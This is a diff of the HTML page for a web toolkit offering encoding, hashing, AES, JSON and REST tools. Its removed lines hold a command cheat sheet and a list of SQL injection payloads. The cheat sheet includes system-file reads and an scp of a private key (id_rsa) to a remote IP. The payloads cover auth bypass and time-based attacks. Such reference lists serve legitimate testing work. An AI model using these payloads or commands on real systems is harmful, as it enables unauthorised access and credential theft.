@@ -10,7 +10,7 @@
 
     <!-- importing css -->
     <link rel="stylesheet" href="./assets/css/bootstrap.css">
-    <link rel="stylesheet" href="./assets/css/style.css">
+    <link rel="stylesheet" href="./assets/css/app.css">
     <!-- importing js -->
     <script src="./assets/js/jquery.js"></script>
     <script src="./assets/js/popper.js"></script>
@@ -23,324 +23,191 @@
     </style>
 </head>
 
-<body class="bg-body">
+<body class="bg-d">
 
-    <div class="container-fluid">
 
-        <nav class="nav nav-tabs">
-            <li class="nav-item">
-                <a data-id="base64" class="nav-link tab_btn  btn m-2 btn btn-sm btn-dark active_tab">
-                    Base64
-               </a>
-            </li>
-            <li class="nav-item">
-                <a data-id="urlencode" class="nav-link tab_btn  btn m-2 btn btn-sm btn-dark">
-                    Url
-               </a>
-            </li>
-            <li class="nav-item">
-                <a data-id="hexer" class="nav-link tab_btn  btn m-2 btn btn-sm btn-dark">
-                    HEX
-               </a>
-            </li>
-            <li class="nav-item">
-                <a data-id="hash" class="nav-link tab_btn  btn m-2 btn btn-sm btn-dark">
-                    Hash
-               </a>
-            </li>
-            <li class="nav-item">
-                <a data-id="json" class="nav-link tab_btn  btn m-2 btn btn-sm btn-dark">
-                    Json
-                </a>
-            </li>
-            <li class="nav-item">
-                <a data-id="cmdlib" class="nav-link tab_btn  btn m-2 btn btn-sm btn-dark">
-                    cmd lib
-               </a>
-            </li>
-            <li class="nav-item">
-                <a data-id="sql" class="nav-link tab_btn  btn m-2 btn btn-sm btn-dark">
-                    SQL Injection
-               </a>
-            </li>
-            <li class="nav-item">
-                <a href="https://github.com/4nkitd/" target="_blank" class="nav-link  btn m-2 btn btn-sm btn-primary">
-                    Github
-               </a>
-            </li>
-        </nav>
+    <nav class="mx-4 my-3 px-2 py-2 bg-s row rounded">
+        <item class="tab_btn btn mx-2 bg-p border-c text-c text-fit d-inline active" data-id="encoding"> Encoding / Decoding </item>
+        <item data-id="terminal" class="tab_btn btn mx-2 bg-p border-c text-c text-fit d-inline"> Terminal </item>
+        <item data-id="aes" class="tab_btn btn mx-2 bg-p border-c text-c text-fit d-inline"> AES </item>
+        <item data-id="rest_api" class="tab_btn btn mx-2 bg-p border-c text-c text-fit d-inline"> REST API </item>
 
-        <div class="container-fluid my-2">
+        <item data-id="json_b" class="tab_btn btn mx-2 bg-p border-c text-c text-fit d-inline"> Json </item>
 
-            <div id="base64" class="border border-success bg-tab-content rounded p-3">
+        <item onclick="that()" class="ml-auto tab_btn btn mx-2 border-c text-c text-fit d-inline"> Help </item>
 
-                <div class="row mx-md-4 mx-sm-1">
+    </nav>
 
-                    <div class="col-md-12 p-2">
-                        <label for="url_dec" class="text-success">Base64</label>
-                        <textarea id="base64_data" rows="3" class="form-control border border-success"
-                            placeholder="Readable String"></textarea>
-                   
+    <main class="m-4 p-3 bg-l row rounded">
+
+        <div class="row w-100 bg-l tab-content" id="encoding">
+            <div class="col-md-4 mx-auto">
+
+                <div class="card bg-s p-4 border-c mx-3">
+                    <div class="row text-c pl-4 ml-4">
+                        <div class="col-6 my-2">
+                            <input type="radio" name="encoding_type" value="base64">
+                            Beae64
+                        </div>
+                        <div class="col-6 my-2">
+                            <input type="radio" name="encoding_type" value="url">
+                            URL
+                        </div>
+                        <div class="col-6 my-2">
+                            <input type="radio" name="encoding_type" value="hex">
+                            HEX
+                        </div>
+                        <div class="col-6 my-2">
+                            <input type="radio" name="encoding_type" value="MD5">
+                            MD5*
+                        </div>
                     </div>
+                </div>
 
-                    <div class="col-md-4 mt-2">
-                        <button class="btn col-md-5 btn-primary btn-sm mx-auto base64_encode">Encode</button>
-                        <button class="btn col-md-5 btn-danger btn-sm mx-auto base64_decode">Decode</button>
+                <div class="row mx-1 my-4 justify-content-center">
+                    <div class="col-6 my-2 mx-o">
+                        <button 
+                            class="btn w-100 bg-s text-c border-c"
+                            onclick="encoding_de()"
+                        >
+                            DeCrypt
+                        </button>
                     </div>
-                    <div class="col-md-8  mt-2">
-                        <p class="text-success text-right">
-                            Your results will be auto copied to clipboard.
-                        </p>
+                    <div class="col-6 my-2 mx-o">
+                        <button onclick="encoding_en()" class="btn w-100  bg-s text-c border-c">EnCrypt</button>
                     </div>
-
+                    <div class="col-6 my-2 mx-o">
+                        <button onclick="copy_encoding(this)" class="btn w-100  bg-s text-c border-c">Copy</button>
+                    </div>
+                    <div class="col-6 my-2 mx-o">
+                        <button class="btn w-100  bg-s text-c border-c">Paste</button>
+                    </div>
                 </div>
 
             </div>
-
-            <div style="display: none;" id="urlencode" class=" border border-success bg-tab-content rounded p-3 ">
-
-                <div class="row mx-md-4 mx-sm-1">
-
-                    <div class="col-md-12 p-2">
-                        <label for="url_data" class="text-success">Url</label>
-                        <textarea id="url_data" rows="3" class="form-control border border-success"
-                            placeholder="Readable String"></textarea>
-                    </div>
-
-                    <div class="col-md-4 mt-2">
-                        <button class="btn col-md-5 btn-primary btn-sm mx-auto url_encode">Encode</button>
-                        <button class="btn col-md-5 btn-danger btn-sm mx-auto url_decode">Decode</button>
-                    </div>
-                    <div class="col-md-8  mt-2">
-                        <p class="text-success text-right">
-                            Your results will be auto copied to clipboard.
-                        </p>
-                    </div>
-
-                </div>
-
+            <div class="col-md-8">
+                <textarea class="bg-d border-p form-control text-c" id="encoding_data" rows="10"></textarea>
             </div>
-
-
-            <div style="display: none;" id="json" class=" border border-success bg-tab-content rounded p-3 ">
-
-                    <div class="row mx-md-4 mx-sm-1">
-
-                        <div class="col-md-12 p-2">
-                            <label for="json_data" class="text-success">Json Beautifier</label>
-                            <textarea id="json_data" rows="3" class="form-control border border-success"
-                                placeholder="Readable String"></textarea>
-                                <pre id="json_data_p" style="display: none;" class="bg-light rounded  border border-success">
-                                </pre>
-                        </div>
-
-                        <div class="col-md-4">
-                            <button class="btn col-md-5 btn-primary btn-sm mx-auto json_beautifier">Beautify</button>
-                            <button class="btn col-md-5 btn-primary btn-sm mx-auto json__retry">Retry</button>
-                        </div>
-                        <div class="col-md-8 ">
-                        </div>
-
-                    </div>
-
-            </div>
-
-
-            <div style="display: none;" id="hexer" class="border border-success bg-tab-content rounded p-3 ">
-
-                <div class="row mx-md-4 mx-sm-1">
-
-                    <div class="col-md-12 p-2">
-                        <label for="hex_data" class="text-success">HEX</label>
-                        <textarea id="hex_data" rows="3" class="form-control border border-success"
-                            placeholder="Readable String"></textarea>
-                    </div>
-
-                    <div class="col-md-4 mt-2">
-                        <button class="btn col-md-5 btn-primary btn-sm mx-auto hex_encode">Encode</button>
-                        <button class="btn col-md-5 btn-danger btn-sm mx-auto hex_decode">Decode</button>
-                    </div>
-                    <div class="col-md-8  mt-2">
-                        <p class="text-success text-right">
-                            Your results will be auto copied to clipboard.
-                        </p>
-                    </div>
-
-                </div>
-
-            </div>
-
-            <div style="display: none;" id="hash" class="border border-success bg-tab-content rounded p-3 ">
-
-                <div class="row mx-md-4 mx-sm-1">
-
-                    <div class="col-md-4 p-2">
-                        <div class="form-group">
-                            <label for="hash_select_enc" class="text-success">Encryption/Hashing</label>
-                            <select class="form-control" aria-label="Select Encryption" id="hash_select_enc">
-                                <option value="" selected>Select Encryption</option>
-                                <option value="MD5">MD5</option>
-                                <option value="SHA256">Sha256</option>
-                                <option value="SHA512">SHA512</option>
-                                <option value="SHA3">SHA3</option>
-                                <option value="AES">AES</option>
-                            </select>
-                        </div>
-                        <div class="form-group my-auto">
-                            <button class="btn col-md-12 my-2 btn-primary btn mx-auto hash_encode">Encode Content</button>
-                           <button class="btn col-md-12 my-2 btn-danger btn mx-auto hash_decode">Decode Content</button>
-                        </div>
-                    </div>
-
-                    <div class="col-md-8 p-2">
-                        <div class="form-group">
-                            <label for="hash_salt" class="text-success">Encryption Salt ( -- 
-                                <span class="d-inline float-right text-success ">
-                                     Your results will be auto copied to clipboard. 
-                                    <span /> -- )
-                            </label>
-                            
-                            <input type="text" class="form-control" id="hash_salt" placeholder="Only for AES">
-                        </div>
-                        <div class="form-group">
-                            <label for="hash_data" class="text-success"> Data </label>
-                            <textarea id="hash_data" rows="2" class="form-control border border-success"
-                                placeholder="Readable Text"></textarea>
-                                
-                        </div>
-                    </div>
-
-                </div>
-
-            </div>
-
-            <div style="display: none;" id="cmdlib"
-                class="border border-success bg-tab-content bg-dark shadow rounded p-3 ">
-
-                <div class="row mx-auto my-auto bg-dark text-success">
-
-                    <ul class="mx-auto">
-                        <li><strong>System Version</strong></li>
-                        <li><code>cat /etc/issue</code></li>
-                        <li><code>cat /etc/*-release</code></li>
-                        <li><code>cat /etc/lsb-release</code></li>
-                        <li><code>cat /etc/redhat-release</code></li>
-                    </ul>
-
-                    <ul class="mx-auto">
-                        <li><strong>User Env</strong></li>
-                        <li><code>cat /etc/profile</code></li>
-                        <li><code>cat /etc/bashrc</code></li>
-                        <li><code>set</code></li>
-                        <li><code>env</code></li>
-                        <li><code>cat ~/.bash_logout</code></li>
-                        <li><code>cat ~/.bashrc</code></li>
-                        <li><code>cat ~/.bash_profile</code></li>
-                    </ul>
-
-                    <ul class="mx-auto">
-                        <li><strong>Networking</strong></li>
-                        <li><code>lsof -i</code></li>
-                        <li><code>lsof -i :80</code></li>
-                        <li><code>grep 80 /etc/services</code></li>
-                        <li><code>netstat -antup</code></li>
-                        <li><code>netstat -antpx</code></li>
-                        <li><code>netstat -tulpn</code></li>
-                        <li><code>chkconfig --list</code></li>
-                        <li><code>last</code></li>
-                    </ul>
-
-                    <ul class="mx-auto">
-                        <li><strong>SCP</strong></li>
-                        <li><code>scp id_rsa username@10.10.164.167:~/destination -P 1337</code></li>
-                        <li><code>scp user@10.10.164.167:~/path_to_file file_saved -P 1337</code></li>
-
-                        <li><strong>python</strong></li>
-                        <li><code>python3 -m http.server 1337</code></li>
-                        <li><code>python -m SimpleHTTPServer 1337</code></li>
-
-                        <li><strong>download</strong></li>
-                        <li><code>wget http://url </code></li>
-                        <li><code>curl -o local_save_path http://url</code></li>
-                    </ul>
-                </div>
-
-
-
-            </div>
-
-            <div style="display: none;" id="sql"
-                class="border border-success bg-tab-content bg-dark shadow rounded p-3 ">
-
-                <div class="row mx-auto my-auto bg-dark text-success">
-
-                    <ul class="mx-auto">
-                        <li><strong>Generic Payload</strong></li>
-                        <li><code>' or '</code></li>
-                        <li><code>-- or # </code></li>
-                        <li><code>' OR '1</code></li>
-                        <li><code>' OR 1 -- -</code></li>
-                        <li><code>OR "" = "</code></li>
-                        <li><code>" OR 1 = 1 -- -"</code></li>
-                    </ul>
-
-                    <ul class="mx-auto">
-                        <li><strong>Generic Payload</strong></li>
-                        <li><code>' OR '' = '</code></li>
-                        <li><code>'='</code></li>
-                        <li><code>'LIKE'</code></li>
-                        <li><code>'=0--+</code></li>
-                        <li><code>OR 1=1</code></li>
-                        <li><code>' OR 'x'='x</code></li>
-                        <li><code>' AND id IS NULL; --</code></li>
-                        <li><code>'''''''''''''UNION SELECT '2</code></li>
-
-                    </ul>
-
-                    <ul class="mx-auto">
-                        <li><strong>Time Based</strong></li>
-                        <li><code>,(select * from (select(sleep(10)))a)</code></li>
-                        <li><code>';WAITFOR DELAY '0:0:30'--</code></li>
-                        <li><code>%2c(select%20*%20from%20(select(sleep(10)))a)</code></li>
-                    </ul>
-
-                    <ul class="mx-auto">
-                        <li><strong>Auth</strong></li>
-                        <li><code>' or ''-'</code></li>
-                        <li><code>' or '' '</code></li>
-                        <li><code>' or ''&'</code></li>
-                        <li><code>' or ''^'</code></li>
-                        <li><code>' or ''*'</code></li>
-                        <li><code>or true--</code></li>
-                    </ul>
-
-                    <ul class="mx-auto">
-                        <li><strong>Auth</strong></li>
-                        <li><code>" or true--</code></li>
-                        <li><code>' or true--</code></li>
-                        <li><code>") or true--</code></li>
-                        <li><code>') or true--</code></li>
-                        <li><code>admin') or ('1'='1'--</code></li>
-                        <li><code>admin') or ('1'='1'#</code></li>
-                        <li><code>admin') or ('1'='1'/</code></li>
-                    </ul>
-                </div>
-
-
-
-            </div>
-
         </div>
 
+        <div style="display: none;" class="row w-100 bg-l pl-4 tab-content" id="terminal">
+            <div class="col-md-6 pl-4 mx-auto">
+                <label class="text-p" for="code">Code</label>
+                <textarea class="bg-d border-p form-control text-c w-100" id="code" rows="10"></textarea>
 
-    </div>
+            </div>
+            <div class="col-1 pt-4">
 
+                <button onclick="run_terminal()" class="btn w-100 bg-s text-c border-c my-4">Run</button>
+
+                <button onclick="$('#code').val('');$('#code_results').val('');" class="btn w-100 bg-s text-c border-c my-4">Clean</button>
+
+                <button onclick="copy_code(this)" class="btn w-100 bg-s text-c border-c my-4">Copy</button>
+
+            </div>
+            <div class="col-md-5">
+                <label class="text-p" for="code_results">Results</label>
+                <textarea class="bg-d border-p form-control text-c w-100" id="code_results" rows="10"></textarea>
+
+            </div>
+        </div>
+
+        <div style="display: none;" class="row w-100 bg-l pl-4 tab-content" id="aes">
+            <div class="col-md-4 pl-4 mx-auto">
+
+                <label class="text-p" for="aes_key">Key / Salt</label>
+                <textarea class="bg-d border-p form-control text-c w-100" id="aes_key" rows="5"></textarea>
+
+                <div class="row mx-1 my-4 justify-content-center">
+                    <div class="col-6 my-2 mx-o">
+                        <button onclick="decrypt_aes()" class="btn w-100 bg-s text-c border-c">DeCrypt</button>
+                    </div>
+                    <div class="col-6 my-2 mx-o">
+                        <button onclick="encrypt_aes()" class="btn w-100  bg-s text-c border-c">EnCrypt</button>
+                    </div>
+                    <div class="col-6 my-2 mx-o">
+                        <button onclick="copy_aes(this)" class="btn w-100  bg-s text-c border-c">Copy</button>
+                    </div>
+                    <div class="col-6 my-2 mx-o">
+                        <button onclick="$('#aes_key').val('');$('#aes_data').val('');" class="btn w-100  bg-s text-c border-c">Clear</button>
+                    </div>
+                </div>
+
+            </div>
+            <div class="col-md-8">
+                <label class="text-p" for="aes_data">Results</label>
+                <textarea class="bg-d border-p form-control text-c w-100" id="aes_data" rows="10"></textarea>
+
+            </div>
+        </div>
+
+        <div style="display: none;" class="row w-100 bg-l pl-4 tab-content" id="rest_api">
+
+            <div class="col-md-6 pl-4 mx-auto">
+
+                <div class="row mx-1 my-4 pr-3">
+                    <select id="rest_type" class="btn bg-s text-c border-c text-fit">
+                        <option value="POST">POST</option>
+                        <option value="GET">GET</option>
+                        <option value="PUT">PUT</option>
+                        <option value="DELETE">DELETE</option>
+                        <option value="OPTIONS">OPTIONS</option>
+                    </select>
+                    <input type="url" placeholder="URL" class="bg-d border-p form-control text-c col mx-1"
+                        id="rest_url">
+                    <input type="button" value="RUN" onclick="send_rest_api_request()" class="btn bg-s text-c border-c text-fit">
+                </div>
+
+                <div class="row mx-1 my-4 ">
+                    <div class="col-3 my-2 pl-0">
+                        <button data-id="rest_headers" class="btn w-100 my-2 bg-s text-c border-c rest_tab_btn">Headers</button>
+                        <button data-id="rest_body" class="btn w-100 my-2 bg-s text-c border-c rest_tab_btn">Body</button>
+                        <button onclick="copy_rest_response(this)" class="btn w-100 my-2 bg-s text-c border-c">Copy</button>
+                    </div>
+                    <div class="col-9 my-2 mx-o">
+                        <textarea class="bg-d border-p form-control text-c w-100 rest_tab_btn-content" id="rest_headers" rows="7">{"Content-Type": "application/json"}
+                        </textarea>
+                        <textarea style="display: none;" class="bg-d border-p form-control text-c w-100 rest_tab_btn-content" id="rest_body" rows="7">{}</textarea>
+                    </div>
+                </div>
+
+            </div>
+            <div class="col-md-6">
+                <label class="text-c" for="rest_response">Response</label>
+                <textarea class="bg-d border-p form-control text-c w-100" id="rest_response" rows="10"></textarea>
+
+            </div>
+        </div>
+
+        <div style="display: none;" class="row w-100 bg-l pl-4 tab-content" id="json_b">
+            <div class="col-md-6 pl-4 mx-auto">
+                <label class="text-p" for="json_data">JSON</label>
+                <textarea class="bg-d border-p form-control text-c w-100" id="json_data" rows="10"></textarea>
+        
+            </div>
+            <div class="col-1 pt-4">
+        
+                <button onclick="json_beautify()" class="btn w-100 bg-s text-c border-c my-4">Run</button>
+        
+                <button onclick="$('#json_data').val('');$('#json_results').html('');"
+                    class="btn w-100 bg-s text-c border-c my-4">Clean</button>
+        
+                <button onclick="copy_json(this)" class="btn w-100 bg-s text-c border-c my-4">Copy</button>
+        
+            </div>
+            <div class="col-md-5">
+                <label class="text-p" for="json_results">Beautified JSON</label>
+                <pre id="json_results" class="bg-d rounded border border-p text-c"></pre>
+        
+            </div>
+        </div>
+
+    </main>
 
     <script src="./assets/js/crypto.js"></script>
     <script src="./assets/js/utf8.js"></script>
     <script src="./assets/js/functions.js"></script>
     <script src="./assets/js/app.js"></script>
-
 </body>
 
 </html>
